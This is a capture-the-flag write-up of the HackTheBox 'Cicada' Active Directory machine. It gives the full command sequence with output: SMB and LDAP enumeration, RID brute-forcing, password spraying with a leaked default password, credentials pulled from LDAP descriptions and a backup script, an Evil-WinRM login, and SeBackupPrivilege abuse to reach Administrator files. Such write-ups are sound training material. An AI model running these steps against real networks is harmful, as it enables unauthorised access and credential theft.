---
title: 'Cicada Walkthrough: Exploiting Shared Access from Guest User Privileges'
date: 2024-10-30 20:00:00 +0530
categories: [red-teaming]
tags:
- HTB
- smb
- credential_compromise
- ldap
- on-prem
description: Walkthrough of HTB's Cicada machine
---
### Recon

To begin the reconnaissance phase, a full port scan was conducted using Nmap to identify open TCP ports on the target. The scan was optimized for speed and aimed at discovering all ports:

```bash
sudo nmap -T5 -sS -n -Pn --disable-arp-ping -p- 10.10.11.35 --max-retries 0
```

#### Explanation of Key Arguments:
- **`-T5`**: Maximizes scan speed.
- **`-sS`**: Conducts a SYN scan, initiating a TCP handshake without completing it for stealthiness.
- **`-n`**: Disables DNS resolution, reducing the time taken.
- **`-Pn`**: Skips host discovery, assuming the host is online.
- **`-p-`**: Scans all 65535 ports.

#### Scan Results and Observations
The scan identified several open ports, which are commonly found on Windows Domain Controllers and associated with Microsoft services:

| Port  | State | Service           |
|-------|-------|--------------------|
| 53    | open  | Domain Name System (DNS) |
| 88    | open  | Kerberos Authentication Service |
| 135   | open  | Microsoft Remote Procedure Call (RPC) |
| 139   | open  | NetBIOS Session Service |
| 389   | open  | Lightweight Directory Access Protocol (LDAP) |
| 445   | open  | Microsoft Directory Services (SMB) |
| 464   | open  | Kerberos Password Change |
| 593   | open  | HTTP RPC Endpoint Mapper |
| 636   | open  | Secure LDAP (LDAPS) |
| 3268  | open  | Global Catalog LDAP |
| 3269  | open  | Global Catalog LDAP over SSL |
| 49623 | open  | Unknown Service |

#### Notable Ports and Potential Services:
- **Port 139/445**: Commonly associated with SMB services, which are often vulnerable in misconfigured Windows environments.
- **Port 389/636**: LDAP and LDAPS are used in Active Directory environments for directory queries and access, useful for user enumeration.
- **Port 88**: Kerberos, the primary authentication protocol in Windows domains.

### Aggressive Nmap Scan for Service and OS Detection
To get more detailed information about the services running on these ports and to attempt operating system detection, an aggressive Nmap scan was conducted:

```bash
sudo nmap -T5 -A --disable-arp-ping -p 53,88,135,139,389,445,464,593,636,3268,3269,49263 10.10.11.35 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 11:20 EDT
Nmap scan report for 10.10.11.35
Host is up (0.13s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-28 22:08:09Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
49263/tcp filtered unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Results Summary
This scan confirmed that the machine is running as a **Windows Domain Controller** with Active Directory services enabled. Additionally, SMB signing is enabled and required, indicating a secure configuration for SMB communications.

---

## 2. SMB Enumeration

The next step involved enumerating SMB shares and configurations. For this purpose, the tool **netexec** was utilized to gain an overview of available SMB shares:



```bash
netexec smb 10.10.11.35 -u guest -p '' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 

```
With read access granted to the guest user on the 'HR' share, I proceeded to enumerate the files within it

```bash
smbclient -N //10.10.11.35/HR
Try "help" to get a list of possible commands.
smb: \> ls
.                                   D        0  Thu Mar 14 08:29:09 2024
..                                  D        0  Thu Mar 14 08:21:29 2024
Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

```

Notice from "HR.txt" has an interesting information 

```bash
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

We are manage to get an one-time password, which should be changed upon successful login. We are yet to find out valid username for logging in.

## FootHold & Privilege escalation

**Note**: Netexec can also brute-force user accounts.
```jsx
netexec smb 10.10.11.35 -u guest -p '' --rid-brute
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing VNC protocol database
[*] Initializing WMI protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Initializing NFS protocol database
[*] Copying default configuration file
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```
Identifying Interesting Users

```jsx
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

Verifying Default Passwords for Users

```jsx
netexec smb 10.10.11.35 -u email.txt  -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

The user michael.wrightson appears to still be using the default password.

Enumerating Shares Accessible by "michael.wrightson"

```jsx
netexec smb 10.10.11.35 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV                             
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share 
```

Leveraging these credentials for further domain enumeration.

![image.png]({{ '/assets/img/Cicada/image.png' | relative_url }})

Filtering Distinguished Names and Descriptions for Interesting Strings

```jsx
ldapsearch -x -H ldap://10.10.11.35 -D 'CICADA\michael.wrightson' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb"  distinguishedName description
```

Finding Password for "David Orelious"

```jsx
# David Orelious, Users, cicada.htb
dn: CN=David Orelious,CN=Users,DC=cicada,DC=htb
description: Just in case I forget my password is aRt$Lp#7t*VQ!3
distinguishedName: CN=David Orelious,CN=Users,DC=cicada,DC=htb

```

Enumerating Share Access for "David Orelious"

```jsx
netexec smb 10.10.11.35 -u 'david.orelious' --password 'aRt$Lp#7t*VQ!3' --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV             READ            
SMB         10.10.11.35     445    CICADA-DC        HR              READ            
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```

Enumerating Files in the DEV Share with David's Credentials

```jsx
smbclient //10.10.11.35/DEV -U 'david.orelious'
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 07:31:39 2024
  ..                                  D        0  Thu Mar 14 07:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 12:28:22 2024

```

Inspecting the Backup Script for Additional Credentials

```jsx
 cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```
The script contains a password for the backup account emily.oscars.
The user has READ, WRITE access to C$ share 

![image.png]({{ '/assets/img/Cicada/image%201.png' | relative_url }})

Logging into the share as â€œemily.oscarsâ€

![image.png]({{ '/assets/img/Cicada/image%202.png' | relative_url }})

Fetching the flag from the user desktop

![image.png]({{ '/assets/img/Cicada/image%203.png' | relative_url }})

Logged in to the machine as emily.oscars leveraging â€œEvil-Winrmâ€.

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                                                                                                                              
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                                                                                                                              
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                                                                                                                              
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                                                                                                                                                                                                                                                                                                              
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                                                                                                                                         
PRIVILEGES INFORMATION                                                                                                                                                                                                                                                                                                                                                                                                                   
----------------------                                                                                                                                                                                                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                                                                                                                                                                                                                         
Privilege Name                Description                    State                                                                                                                                                                                                                                                                                                                                                                       
============================= ============================== =======                                                                                                                                                                                                                                                                                                                                                                     
SeBackupPrivilege             Back up files and directories  Enabled                                                                                                                                                                                                                                                                                                                                                                     
SeRestorePrivilege            Restore files and directories  Enabled                                                                                                                                                                                                                                                                                                                                                                     
SeShutdownPrivilege           Shut down the system           Enabled                                                                                                                                                                                                                                                                                                                                                                     
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                                                                                                                                                                                                                                                                                                     
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled                                                                                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                                                                                                                                         
USER CLAIMS INFORMATION                                                                                                                                                                                                                                                                                                                                                                                                                  
-----------------------                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                                                                                                                                         
User claims unknown.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
```

User emily.oscars has the Backup privilege enabled. Uploading the necessary module to leverage this privilege for replication.

```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents\Backup> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents\Backup> Import-Module .\SeBackupPrivilegeUtils.dll

```

Using robocopy to copy the Administrator's desktop files to a temporary folder.

![image.png]({{ '/assets/img/Cicada/image%204.png' | relative_url }})

Accessing root.txt

![image.png]({{ '/assets/img/Cicada/image%205.png' | relative_url }})

---
### References

[Pentesting LDAP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)

[SMB Enumeration Cheatsheet | 0xdf hacks stuff](https://0xdf.gitlab.io/cheatsheets/smb-enum)

[Leveraging LDAP](https://github.com/k4sth4/SeBackupPrivilege)




